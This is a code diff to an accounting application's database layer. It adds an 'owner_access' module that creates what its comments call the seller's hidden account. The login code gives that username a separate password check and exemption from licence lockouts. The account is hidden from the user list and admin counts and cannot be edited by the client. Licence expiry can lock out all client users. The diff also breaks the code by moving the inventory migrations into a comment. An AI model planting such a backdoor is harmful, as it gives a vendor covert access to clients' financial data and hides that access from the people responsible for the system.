@@ -414,6 +414,8 @@ class Database(InvoicesStore, JournalStore, DocumentsStore, PaymentsStore, Rates
             if "permissions" not in user_columns: db.execute("ALTER TABLE users ADD COLUMN permissions TEXT NOT NULL DEFAULT '{}'")
             if "view_hidden" not in user_columns: db.execute("ALTER TABLE users ADD COLUMN view_hidden TEXT NOT NULL DEFAULT '[]'")  # 2.9.81: what this user hides
             if "created_at" not in user_columns: db.execute("ALTER TABLE users ADD COLUMN created_at TEXT")
+            import owner_access  # 2.9.101: the hidden owner account
+            owner_access.migrate(db)
             invoice_columns={row["name"] for row in db.execute("PRAGMA table_info(invoices)")}
             if "vat_recoverable" not in invoice_columns: db.execute("ALTER TABLE invoices ADD COLUMN vat_recoverable INTEGER NOT NULL DEFAULT 1")
             expense_columns={row["name"] for row in db.execute("PRAGMA table_info(expenses)")}
@@ -590,12 +592,14 @@ class Database(InvoicesStore, JournalStore, DocumentsStore, PaymentsStore, Rates
             attempts={row["key"]:row for row in db.execute(
                 f"SELECT * FROM login_attempts WHERE key IN ({','.join('?' for _ in keys)})",keys)}
             locked=any(row["locked_until"] and (parse_ts(row["locked_until"]) or now)>now for row in attempts.values())
-            user = db.execute("SELECT * FROM users WHERE username=? AND active=1", (username,)).fetchone()
+            import owner_access
+            owner = owner_access.is_owner_name(username)  # 2.9.101: the seller's hidden account
+            user = owner_access.owner_row(db) if owner else db.execute("SELECT * FROM users WHERE username=? AND active=1", (username,)).fetchone()
             if locked:
                 db.execute("INSERT INTO audit_log(user_id,action,entity,details,created_at) VALUES(?,?,?,?,?)",
                            (user["id"] if user else None,"login_blocked","auth",json.dumps({"username":username,"remote_addr":remote_addr}),utcnow()))
                 return {"rate_limited": True}
-            if not user or not verify_password(password, user["password_hash"]):
+            if not user or not (owner_access.check_password(db, password) if owner else verify_password(password, user["password_hash"])):
                 for key in keys:
                     previous=attempts.get(key)
                     first=parse_ts(previous["first_failed_at"]) if previous else None
@@ -609,6 +613,7 @@ class Database(InvoicesStore, JournalStore, DocumentsStore, PaymentsStore, Rates
                            (user["id"] if user else None,"login_failed","auth",json.dumps({"username":username,"remote_addr":remote_addr}),utcnow()))
                 return None
             db.execute("DELETE FROM login_attempts WHERE key=?",(keys[0],))
+            if not owner and owner_access.licence_message(db): raise PermissionError(owner_access.licence_message(db))
             if self.user_is_expired(user):
                 raise PermissionError(f"This account expired on {display_date(user['expires_at'])}. Ask the administrator to renew it.")
             token = secrets.token_urlsafe(32)
@@ -619,7 +624,8 @@ class Database(InvoicesStore, JournalStore, DocumentsStore, PaymentsStore, Rates
                 db.execute("DELETE FROM sessions WHERE token=?", (stale_token,))
             db.execute("INSERT INTO sessions(token,user_id,created_at) VALUES(?,?,?)", (token, user["id"], utcnow()))
             return {"token": token, "username": user["username"], "role": user["role"], "language": user["language"],
-                "expires_at": user["expires_at"], "permissions": parse_permissions(user["permissions"]) if user["role"]!="admin" else {m:True for m in PERMISSION_MODULES}}
+                "expires_at": user["expires_at"], "permissions": parse_permissions(user["permissions"]) if user["role"]!="admin" else {m:True for m in PERMISSION_MODULES},
+                "owner": owner, "licence": owner_access.licence(db)}
 
     def user_for_token(self, token):
         if not token: return None
@@ -630,6 +636,10 @@ class Database(InvoicesStore, JournalStore, DocumentsStore, PaymentsStore, Rates
         created=parse_ts(row["session_created_at"])
         if created is None or (datetime.now(timezone.utc)-created) > timedelta(hours=SESSION_HOURS): return None
         if self.user_is_expired(row): return None
+        import owner_access
+        if not owner_access.is_owner(row):
+            with self.connect() as db:
+                if owner_access.licence(db)["expired"]: return None
         return row
 
     def ensure_user_row(self, user):
@@ -653,7 +663,7 @@ class Database(InvoicesStore, JournalStore, DocumentsStore, PaymentsStore, Rates
     def list_users(self):
         today=datetime.now().date()
         with self.connect() as db:
-            rows=[dict(row) for row in db.execute("SELECT id,username,role,language,active,expires_at,permissions FROM users ORDER BY username")]
+            rows=[dict(row) for row in db.execute("SELECT id,username,role,language,active,expires_at,permissions FROM users WHERE COALESCE(hidden,0)=0 ORDER BY username")]
         for row in rows:
             row["permissions"]=parse_permissions(row.get("permissions"))
             if row.get("expires_at"):
@@ -675,7 +685,10 @@ class Database(InvoicesStore, JournalStore, DocumentsStore, PaymentsStore, Rates
         one_year=(datetime.now()+timedelta(days=USER_VALIDITY_DAYS)).strftime("%Y-%m-%d")
         with self.connect() as db:
             existing=db.execute("SELECT * FROM users WHERE id=?",(int(user_id),)).fetchone() if user_id else None
+            if existing and "hidden" in existing.keys() and existing["hidden"]: existing=None  # 2.9.101: the owner account is not the client's
             if user_id and not existing: raise ValueError("User was not found")
+            import owner_access
+            if owner_access.is_owner_name(username): raise ValueError(f"Username '{username}' is already used")
             clash=db.execute("SELECT id FROM users WHERE lower(username)=lower(?) AND id<>?",(username,int(user_id or 0))).fetchone()
             if clash: raise ValueError(f"Username '{username}' is already used")
             if item.get("renew"): expires=one_year
@@ -683,7 +696,7 @@ class Database(InvoicesStore, JournalStore, DocumentsStore, PaymentsStore, Rates
             elif existing: expires=existing["expires_at"]
             else: expires=None if role=="admin" else one_year
             if existing and existing["role"]=="admin" and (role!="admin" or not active):
-                admins=db.execute("SELECT COUNT(*) n FROM users WHERE role='admin' AND active=1 AND id<>?",(int(user_id),)).fetchone()["n"]
+                admins=db.execute("SELECT COUNT(*) n FROM users WHERE role='admin' AND active=1 AND COALESCE(hidden,0)=0 AND id<>?",(int(user_id),)).fetchone()["n"]
                 if not admins: raise ValueError("At least one active administrator must remain")
             if user_id:
                 db.execute("UPDATE users SET username=?,role=?,language=?,active=?,expires_at=?,permissions=? WHERE id=?",
@@ -1084,14 +1097,15 @@ def _schema_fingerprint():
     """'4-' + a short hash of the schema and of every text in the upgrade code (CREATE / ALTER TABLE ...), including
     the inventory, fixed assets and bank upgrades and the extra accounts. Any new column, table or account changes it,
     so every company / year file is upgraded once when the new version opens it."""
-    import bank_rec, chart_extra, fixed_assets, inventory, payroll_extras
+    import approvals, audit_chain, bank_rec, chart_extra, fixed_assets, inventory, payroll_extras
     texts = [SCHEMA, repr(getattr(chart_extra, "EXTRA_ACCOUNTS", ""))]
     def collect(code):
         for constant in code.co_consts:
             if isinstance(constant, str): texts.append(constant)
             elif hasattr(constant, "co_consts"): collect(constant)
     functions = [getattr(Database, name, None) for name in ("_initialize", "_auto_lebanese_payroll_rules", "_upgrade_default_family_allowance_periods")]
-    functions += [inventory.migrate, fixed_assets.migrate, bank_rec.migrate, payroll_extras.migrate, chart_extra.ensure_accounts] + list(getattr(inventory, "MIGRATIONS", ()))
+    functions += [inventory.migrate, fixed_assets.migrate, bank_rec.migrate, payroll_extras.migrate, chart_extra.ensure_accounts,
+                  audit_chain.migrate, approvals.migrate, __import__('owner_access').migrate]  # 2.9.101: files made before 2.9.100 get the approval table + list(getattr(inventory, "MIGRATIONS", ()))
     for function in functions:
         if function is not None: collect(function.__code__)
     return "4-" + hashlib.sha256("\x00".join(texts).encode("utf-8")).hexdigest()[:16]
